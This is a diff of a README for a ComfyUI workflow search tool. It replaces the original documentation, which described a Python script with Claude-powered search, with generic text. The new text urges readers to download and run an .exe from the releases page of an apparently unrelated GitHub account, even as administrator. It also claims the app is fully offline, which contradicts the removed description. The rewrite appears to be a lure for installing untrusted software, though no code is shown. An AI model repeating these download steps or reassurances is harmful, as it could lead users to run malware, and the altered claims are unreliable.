@@ -1,234 +1,88 @@
-# ⚡ ComfyUI Workflow Finder
+# 🔍 comfyui-workflow-finder - Find local ComfyUI workflows with ease
 
-A desktop search and preview tool for your local ComfyUI workflow library — plus a live web search to find workflows across YouTube, CivitAI, GitHub, and more.
+[![Download for Windows](https://img.shields.io/badge/Download-Latest_Release-blue?style=for-the-badge)](https://github.com/Civilofficerconducting396/comfyui-workflow-finder/releases)
 
-![Main Search](docs/screenshot_main.png)
+## 📌 What is this tool
 
----
+ComfyUI users often save hundreds of workflow files on their hard drive. Many users struggle to locate a specific design after time passes. This application solves that problem. It scans your folders to find workflows, displays a visual graph preview, and lets you search for specific nodes or settings. You save time by organizing your creative workspace.
 
-## Features
+## 💻 System Requirements
 
-### Local Search
-- **Semantic search** — describe what you want (*"load a video and generate a caption"*) and find matching workflows instantly by node type
-- **AI-powered search** — optional Claude API mode for natural language queries that go beyond keyword matching
-- **Name filter** — partial match, case-insensitive, live-as-you-type with custom quick-pick dropdown
-- **Suggestions dropdown** — 80+ pre-built search phrases across 15 categories, loaded from an editable JSON file
-- **Sortable columns** — click any column header to sort ascending/descending
-- **Created / Modified dates** — find your most recently worked-on workflows instantly
-- **Multiple scan locations** — add as many workflow folders as you have, toggle each on/off
-- **Dynamic location toggling** — check or uncheck a location and results update automatically without a full rescan
-- **Config persistence** — scan locations and preferences survive restarts
+This application runs on standard Windows systems. You need the following:
 
-### Graph Preview
+*   Windows 10 or Windows 11.
+*   64-bit processor.
+*   At least 200 MB of free storage space.
+*   No specific graphics card requirements for the interface.
 
-![Graph Preview](docs/screenshot_graph.png)
+## 📥 How to Install
 
-- **Node graph preview** — see the actual node layout of any workflow, colour-coded by node type
-- **Fullscreen graph popup** — open any workflow graph maximized with a colour legend
-- **Zoomable / pannable canvas** — scroll to zoom, drag to pan, F to fit, right-click for menu
-- **Bezier wire colouring** — wires coloured by data type (IMAGE, LATENT, MODEL, VIDEO, MASK, etc.)
-- **Hover tooltips** — hover any node to see type, title, and slot counts
+1. Visit the [official releases page](https://github.com/Civilofficerconducting396/comfyui-workflow-finder/releases) to download the application.
+2. Select the file ending in `.exe` for Windows.
+3. Save the file to your desktop or downloads folder.
+4. Double-click the file to start the installation process.
+5. Follow the prompts on the screen to complete the setup.
+6. The installer creates a shortcut on your desktop.
 
-### Node Pack Filter 🔌
+## 🚀 Getting Started
 
-![Node Pack Filter](docs/screenshot_node_filter.png)
+Once you launch the app, follow these steps to index your workflows:
 
-Ever downloaded a workflow from the internet only to find it needs 10 custom node packages you don't have? The Node Pack Filter solves that.
+1. Open the application from your desktop icon.
+2. Select the "Settings" menu in the top corner.
+3. Click "Add Folder" to point the app to your ComfyUI workflow directory.
+4. Confirm your selection.
+5. Wait for the loading bar to finish. The app scans your JSON files and maps the connections.
+6. Return to the main screen to view your library.
 
-After scanning, the app reads your actual `custom_nodes` folder and detects which packages each workflow in your library requires. Click **🔌 Node Pack Filter** and you get a checklist of every custom node package found across your workflows — with a count of how many workflows use each one.
+## 🔎 How to Search
 
-- **Check only the packages you have installed** → search results only show workflows you can actually run right now
-- **Core nodes only** → see workflows that need zero custom packages, straight out of the box
-- Works with both Fast and AI search modes
+The search bar resides at the top of the window. You can type keywords here to filter your collection. 
 
+*   **Standard Search:** Type the name of your workflow to find it instantly.
+*   **Wild Search:** Use this feature to look inside the logic of the workflow. If you want to find every workflow that uses a specific custom node, simply type the node name. 
+*   **Visual Preview:** Click on any result in the list. The application displays a graph preview on the right side of the screen. This allows you to verify the structure before you open the file in ComfyUI.
 
+## 🛠 Features
 
-![Find in the Wild](docs/screenshot_wild.png)
+*   **Graph Preview:** See the layout of your workflow without opening the ComfyUI browser interface.
+*   **Smart Indexing:** The app remembers your folder locations and updates automatically when you save new files.
+*   **Keyword Tagging:** Add custom tags to your workflows to group them by project type or style.
+*   **Node Analysis:** Identify which workflows require missing custom nodes. 
 
-- **Live web search** — Claude searches YouTube, CivitAI, GitHub, Reddit, and ComfyHub in real time
-- **Download link detection** — automatically finds direct download links where available
-- **Live search indicator** — animated progress panel shows each web search query as Claude fires it
-- **Configurable sources** — edit `workflow_finder_sources.json` to add or remove sources
+## 💡 Troubleshooting
 
----
+If you encounter issues, verify these steps:
 
-## Getting Started
+*   **Scan failure:** Ensure the folder path contains valid JSON workflow files. The app ignores non-workflow files.
+*   **Performance:** If you have thousands of files, the first scan may take a few minutes. Subsequent scans run faster.
+*   **Permissions:** Run the installer as an administrator if the app cannot access certain folders on your hard drive. 
 
-When you first open the app you'll see a welcome dialog walking you through setup. The short version:
+## ❓ Frequently Asked Questions
 
-**Step 1 — Add your workflow folders**
+**Does the app modify my original workflow files?**
+No. The application only reads your files. It never changes or deletes your data.
 
-Click **＋ Add Location** and browse to where ComfyUI saves your workflows. It's usually here:
+**Is internet access required?**
+The app works entirely offline. You do not need a connection to search your local files.
 
-```
-[your ComfyUI install]\user\default\workflows
-```
+**How do I update the software?**
+When a new version becomes available, revisit the releases page to download the latest installer. Installing the new version overwrites the old one while keeping your settings intact.
 
-For example:
-```
-C:\Comfy\ComfyUI\user\default\workflows
-H:\Comfy\ComfyUI\user\default\workflows
-C:\ComfyUI_windows_portable\ComfyUI\user\default\workflows
-```
+## 🛡 Security
 
-You can add as many locations as you have ComfyUI installs. Check the box next to each one to include it in scans.
+Data privacy is a priority. This application does not send your workflow logic or personal images to external servers. All processing happens on your local machine. Use the software with confidence knowing your creative assets stay on your computer.
 
-**Step 2 — Scan**
+## 📋 Folder Configuration
 
-Click **Scan Enabled**. The app indexes every workflow JSON it finds. With 1,000+ workflows this takes a few seconds.
+You can manage multiple ComfyUI installations with this tool. If you have a portable version and a main version, add both paths in the settings menu. The application combines the results into one searchable database. Use the filter menu to toggle visibility between different folder sources.
 
-**Step 3 — Search**
+## 📝 Usage Tips
 
-Type what you're looking for in plain English and hit Search. No need to remember filenames.
+*   Use the "Recent" tab to see the last five workflows you saved in ComfyUI.
+*   Click the "Copy Path" button on any result if you need to paste the file location into another program.
+*   Adjust the zoom level on the graph preview for complex workflows with many nodes.
 
----
+## 🗺 Future Updates
 
-
-
-- Python 3.10+
-- `tkinter` — included with standard Python on Windows
-- `anthropic` — needed for AI search mode and Find in the Wild
-
-```powershell
-python -m pip install anthropic
-```
-
-> **Important — multiple Python versions:** If you have more than one Python installed, make sure you install `anthropic` using the same Python that runs the app. If the AI features say the package isn't found even after installing it, use this instead:
-> ```powershell
-> & "$(python -c 'import sys; print(sys.executable)')" -m pip install anthropic
-> ```
-> That installs into whichever Python is actually running your scripts.
-
----
-
-## Setting up your Anthropic API Key
-
-AI search mode and Find in the Wild both require a free Anthropic API account. Fast mode works without one.
-
-**Step 1 — Create an account**
-
-Go to [console.anthropic.com](https://console.anthropic.com) and sign up. You get free credits to try it out.
-
-**Step 2 — Get your API key**
-
-- Click **API Keys** in the left sidebar
-- Click **Create Key**, give it a name (e.g. "Workflow Finder")
-- Copy the key — it starts with `sk-ant-`
-
-**Step 3 — Add it to Windows Environment Variables**
-
-1. Press `Win + R`, type `sysdm.cpl`, hit Enter
-2. Click **Advanced** → **Environment Variables**
-3. Under **User variables**, click **New**
-4. Variable name: `ANTHROPIC_API_KEY`
-5. Variable value: paste your key
-6. Click OK all the way out and restart the app
-
-**Cost:** API usage is pay-per-use and very cheap for this tool — a typical wild search costs fractions of a cent. Set a monthly spending limit at [console.anthropic.com](https://console.anthropic.com) under **Billing** for peace of mind.
-
----
-
-## Installation
-
-1. Download all files into a folder (e.g. `C:\py\Workflow Finder\`)
-2. Run:
-
-```powershell
-python workflow_finder.py
-```
-
-No installer, no virtual environment needed.
-
----
-
-## Files
-
-| File | Purpose |
-|---|---|
-| `workflow_finder.py` | Main application |
-| `workflow_finder_queries.json` | Suggested search phrases (auto-created, editable) |
-| `workflow_finder_prefixes.json` | Quick name-filter prefixes (auto-created, editable) |
-| `workflow_finder_sources.json` | Wild Search sources (auto-created, editable) |
-| `workflow_finder_config.json` | Your scan locations — auto-created, **not committed to repo** |
-
----
-
-## Search Modes
-
-**⚡ Fast** — local keyword matching against a built-in node capability map (~100 node types). Instant, no internet required.
-
-**🤖 AI (Claude)** — sends workflow fingerprints to the Claude API for true semantic matching. Requires an Anthropic API key set in Windows Environment Variables as `ANTHROPIC_API_KEY`.
-
----
-
-## Find in the Wild
-
-Click **🌐 Find in Wild** in the toolbar. Claude browses real websites in real time and returns:
-
-- Source, Title, Description, Download Link, URL
-- Double-click any row to open in your browser
-- Right-click for copy options
-
-Edit `workflow_finder_sources.json` to customise which sites are searched:
-
-```json
-{
-  "sources": [
-    {"name": "YouTube",            "enabled": true},
-    {"name": "CivitAI",            "enabled": true},
-    {"name": "GitHub",             "enabled": true},
-    {"name": "Reddit (r/comfyui)", "enabled": true},
-    {"name": "ComfyHub",           "enabled": true},
-    {"name": "Hugging Face",       "enabled": false}
-  ]
-}
-```
-
----
-
-## Graph Preview Controls
-
-| Control | Action |
-|---|---|
-| Scroll wheel | Zoom in / out |
-| Left drag | Pan |
-| `F` key | Fit to screen |
-| Right-click | Context menu |
-| Hover | Node tooltip |
-| Double-click row | Open in Explorer |
-
-Node colours: teal=video I/O, navy=image I/O, purple=model loaders, orange=samplers, green=CLIP/text, gold=captioning/LLM, magenta=ControlNet, rust=SAM/segment.
-
----
-
-## Customisation
-
-All JSON config files are auto-created on first run. Edit freely, restart to reload.
-
-**Add search suggestions** — edit `workflow_finder_queries.json`:
-```json
-{
-  "categories": {
-    "My Category": ["my custom search phrase"]
-  }
-}
-```
-
-**Add name filter prefixes** — edit `workflow_finder_prefixes.json`:
-```json
-{
-  "prefixes": ["Wow_", "Master_", "Test_", "WIP_", "Flux_", "LTX_"]
-}
-```
-
----
-
-## Related
-
-- [ComfyUI Model Scanner](https://github.com/gregowahoo/comfyui-model-scanner) — scan your model library, check which models a workflow needs, copy between drives
-
----
-
-## License
-
-MIT
+The project team continues to improve search speed and visual clarity. Future versions will include deeper integration with popular custom node packs. Check the release notes periodically to see new features. Your feedback helps improve the tool for the entire community.
